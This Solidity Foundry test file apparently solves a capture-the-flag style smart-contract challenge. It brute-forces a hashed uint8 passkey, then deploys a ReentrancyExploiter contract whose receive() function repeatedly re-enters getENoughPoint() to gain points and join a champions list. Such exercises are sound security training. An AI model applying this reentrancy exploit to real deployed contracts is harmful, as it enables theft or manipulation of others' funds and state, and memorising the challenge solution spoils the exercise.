// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/Challenge3.sol";

/**
 * @title ReentrancyExploiter
 * @notice Exploits the reentrancy vulnerability in ChallengeTwo.getENoughPoint()
 */
contract ReentrancyExploiter {
    ChallengeTwo public challenge;
    uint256 public callCount;
    string public targetName;

    constructor(ChallengeTwo _challenge) {
        challenge = _challenge;
    }

    // Fallback function triggered by msg.sender.call("") in getENoughPoint()
    receive() external payable {
        callCount++;

        // Reenter getENoughPoint() up to 4 times total
        if (callCount < 4) {
            challenge.getENoughPoint(targetName);
        }
    }

    // Initiates the reentrancy attack
    function exploit(string memory _targetName) public {
        targetName = _targetName;
        callCount = 0;
        challenge.getENoughPoint(_targetName);
    }
}

/**
 * @title Challenge3 Test Suite
 * @notice Tests all 4 steps of the Challenge3 exploit:
 * 1. Find and use the correct passkey
 * 2. Create reentrancy exploiter
 * 3. Execute reentrancy attack (4 points)
 * 4. Join champions array
 */
contract Challenge3Test is Test {
    ChallengeTwo challenge;
    ReentrancyExploiter exploiter;
    address attacker = makeAddr("attacker");

    // Target hash for the passkey
    bytes32 constant PASSKEY_HASH =
        0x98a476f1687bc3d60a2da2adbcba2c46958e61fa2fb4042cd7bc5816a710195b;

    function setUp() public {
        challenge = new ChallengeTwo();
    }

    /**
     * @notice Step 1: Find the correct passkey by brute force
     * The passkey is a uint8 value that hashes to PASSKEY_HASH
     */
    function findPassKey() internal pure returns (uint8) {
        for (uint256 i = 0; i < 256; i++) {
            uint8 testKey = uint8(i);
            if (keccak256(abi.encode(testKey)) == PASSKEY_HASH) {
                return testKey;
            }
        }
        revert("Passkey not found");
    }

    /**
     * STEP 1 TEST: Find and use the correct passkey
     * This unlocks level 1 by calling passKey() with the correct key
     */
    function test_step1_find_and_use_passkey() public {
        console.log("\n===== STEP 1: Finding Passkey =====");

        uint8 correctKey = findPassKey();
        console.log("Found passkey:", uint256(correctKey));

        // Call passKey as attacker
        vm.prank(attacker);
        challenge.passKey(correctKey);

        // Verify by calling getENoughPoint (would revert if passkey wasn't set)
        vm.prank(attacker);
        challenge.getENoughPoint("TestName");

        console.log("Passkey used successfully\n");
    }

    /**
     * STEP 2 TEST: Create the reentrancy exploiter contract
     * This contract will be used to exploit the vulnerable call in getENoughPoint()
     */
    function test_step2_deploy_exploiter() public {
        console.log("===== STEP 2: Deploy Reentrancy Exploiter =====");

        exploiter = new ReentrancyExploiter(challenge);

        console.log("Exploiter deployed at:", address(exploiter));
        console.log("[PASS] Exploiter contract ready\n");
    }

    /**
     * STEP 3 TEST: Execute reentrancy attack
     * By calling getENoughPoint() through the exploiter's receive() function,
     * we can accumulate 4 points (userPoint) in a single transaction
     *
     * Attack Flow:
     * exploit() -> getENoughPoint() -> msg.sender.call("") -> receive() -> getENoughPoint() -> ...
     */
    function test_step3_execute_reentrancy_attack() public {
        console.log("===== STEP 3: Execute Reentrancy Attack =====");

        // Setup: Find passkey and create exploiter
        uint8 correctKey = findPassKey();
        vm.prank(attacker);
        challenge.passKey(correctKey);

        exploiter = new ReentrancyExploiter(challenge);

        // Execute the attack as attacker
        vm.prank(attacker);
        string memory myName = "TestHacker";
        exploiter.exploit(myName);

        console.log("Exploit executed with name:", myName);
        console.log("[PASS] Reentrancy attack successful\n");
    }

    /**
     * STEP 4 TEST: Add attacker to champions array
     * After accumulating 4 points, addYourName() will accept the address
     */
    function test_step4_add_to_champions() public {
        console.log("===== STEP 4: Add to Champions =====");

        // Setup steps 1-3
        uint8 correctKey = findPassKey();
        vm.prank(attacker);
        challenge.passKey(correctKey);

        exploiter = new ReentrancyExploiter(challenge);

        vm.prank(attacker);
        string memory myName = "Champion";
        exploiter.exploit(myName);

        // Step 4: Add to champions
        vm.prank(attacker);
        challenge.addYourName();

        console.log("Added to champions array");

        // Verify
        string[] memory winners = challenge.getAllwiners();
        console.log("Total winners:", winners.length);
        console.log("Winner name:", winners[0]);

        console.log(" Successfully added to champions\n");
    }

    /**
     * INTEGRATION TEST: Full challenge completion
     * Runs all 4 steps in sequence and verifies the final state
     */
    function test_full_challenge_completion() public {
        console.log("\n========== FULL CHALLENGE COMPLETION ==========\n");

        // Step 1: Find and use passkey
        console.log("STEP 1: Using passkey");
        uint8 correctKey = findPassKey();
        console.log("  - Passkey found:", uint256(correctKey));

        vm.prank(attacker);
        challenge.passKey(correctKey);
        console.log("  - passKey() called\n");

        // Step 2: Deploy exploiter
        console.log("STEP 2: Deploying exploiter");
        exploiter = new ReentrancyExploiter(challenge);
        console.log("  - Exploiter deployed:", address(exploiter), "\n");

        // Step 3: Execute reentrancy
        console.log("STEP 3: Executing reentrancy attack");
        vm.prank(attacker);
        string memory finalName = "AzeezAbidoye";
        exploiter.exploit(finalName);
        console.log("  - Attack executed with name:", finalName, "\n");

        // Step 4: Add to champions
        console.log("STEP 4: Adding to champions");
        vm.prank(attacker);
        challenge.addYourName();
        console.log("  - addYourName() called\n");

        // Verify final state
        console.log("========== VERIFICATION ==========");
        string[] memory allWinners = challenge.getAllwiners();
        console.log("Total champions:", allWinners.length);

        for (uint i = 0; i < allWinners.length; i++) {
            console.log("  Champion", i + 1, ":", allWinners[i]);
        }

        // Assert victory
        assert(allWinners.length >= 1);
        assertEq(allWinners[allWinners.length - 1], finalName);

        console.log("\n CHALLENGE COMPLETED SUCCESSFULLY \n");
    }
}
